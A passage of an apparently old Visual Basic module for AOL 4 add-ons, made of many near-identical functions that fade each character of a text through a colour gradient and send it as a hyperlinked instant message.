        f = e * b
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldGreyBlackGrey(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldGreyBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldGreyBlueGrey(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldGreyGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldGreyGreenGrey(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldGreyPurple(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldGreyPurpleGrey(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldGreyRed(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldGreyRedGrey(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldGreyYellow(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldGreyYellowGrey(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function

Function AoL4_ImLinkBoldBlackBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBlackBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBlackBlueBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBlackGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBlackGreenBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBlackGrey(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBlackGreyBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBlackPurple(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBlackPurpleBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBlackRed(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBlackedRedBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBlackRedBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBlackYellow(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBlackYellowBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBlueBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBlueBlackBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBlueGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBlueGreenBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBluePurple(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBluePurpleBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBlueRed(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBlueRedBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBlueYellow(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBlueYellowBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldBlackBlueBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldBlackGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldBlackGreenBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldBlackGrey(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldBlackGreyBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldBlackPurple(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldBlackPurpleBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldBlackRed(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldBlackedRedBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldBlackRedBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldBlackYellow(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkBoldBlackYellowBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_ImLinkBoldBlueBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_ImLinkBoldBlueBlackBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_ImLinkBoldBlueGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_ImLinkBoldBlueGreenBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_ImLinkBoldBluePurple(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_ImLinkBoldBluePurpleBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_ImLinkBoldBlueRed(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_ImLinkBoldBlueRedBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_ImLinkBoldBlueYellow(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function

Function AoL4_ImLinkBoldBlueYellowBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u><b>" + Msg + "</a>")
End Function
Function AoL4_ImLinkGreenBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkGreenBlackGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkGreenBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkGreenBlueGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkGreenPurple(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImLinkGreenPurpleGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkGreenRed(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkGreenRedGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkGreenYellow(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkGreenYellowGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & "></b>" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ></u>" + Msg + "</a>")
End Function
Function AoL4_ImLinkGreyBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
